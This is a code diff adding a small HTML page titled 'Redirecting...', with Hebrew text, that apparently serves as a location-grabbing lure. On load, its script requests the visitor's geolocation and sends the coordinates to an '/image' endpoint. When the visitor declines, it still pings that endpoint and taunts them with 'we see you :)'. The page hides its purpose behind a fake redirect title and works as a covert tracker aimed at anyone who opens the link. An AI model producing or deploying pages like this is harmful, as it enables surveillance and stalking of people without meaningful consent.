@@ -1,1 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redirecting...</title>
+  <script>
+    // קוד לגישה למיקום
+    function sendLocation(lat, lon) {
+      const endpoint = `/image?lat=${lat}&lon=${lon}`;
+      fetch(endpoint)
+        .then(() => {
+          document.body.innerHTML = "<h2>📍 המיקום נשלח, תודה!</h2>";
+        })
+        .catch(() => {
+          document.body.innerHTML = "<h2>שגיאה בשליחה</h2>";
+        });
+    }
+
+    function noLocation() {
+      fetch('/image')
+        .then(() => {
+          document.body.innerHTML = "<h2>⛔️ מיקום לא נשלח, אבל אנחנו רואים אותך :)</h2>";
+        });
+    }
+
+    // בקשת מיקום מהמשתמש
+    window.onload = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            sendLocation(pos.coords.latitude, pos.coords.longitude);
+          },
+          () => {
+            noLocation();
+          }
+        );
+      } else {
+        noLocation();
+      }
+    };
+  </script>
+</head>
+<body>
+  <h2>🔄 טוען מיקום...</h2>
+</body>
+</html>
 
